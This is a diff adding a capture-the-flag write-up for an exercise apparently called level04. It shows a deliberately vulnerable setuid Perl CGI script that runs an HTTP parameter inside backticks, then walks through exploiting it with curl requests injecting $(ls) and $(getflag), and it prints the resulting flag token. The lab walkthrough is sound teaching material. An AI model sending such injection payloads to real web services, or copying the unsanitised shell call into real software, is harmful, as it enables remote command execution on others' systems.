@@ -17,8 +17,60 @@ level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
 ```
 
 ```bash 
-$ ./level03
-Exploit me
+$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
 ```
+
+## Reading doc about Perl
+
+Langage initially used for text processing.
+The program is a CGI script in Perl (served by a web server on port 4747) that retrieves a parameter x from an HTTP request, executes a shell command with this value, and returns the result or any errors as HTML content.
+
+## Executing the script 
+```bash 
+$ curl -I http://localhost:4747
+HTTP/1.1 200 OK
+Date: Thu, 15 May 2025 08:29:20 GMT
+Server: Apache/2.2.22 (Ubuntu)
+Vary: Accept-Encoding
+Content-Type: text/html
+
+```
+
+```bash 
+$ curl  http://localhost:4747?x=salut
+salut
+```
+
+## Finding the vulnerability
+
+We know that we pass an argument to a function without checking it, let's try to pass a shell command.
+
+
+```bash 
+$ curl 'http://localhost:4747?x=$(ls)'
+level04.pl
+
+```
+
+It works ! Let's try with getflag then :
+
+```bash 
+$ curl 'http://localhost:4747?x=$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
+
+
+
+
 
 
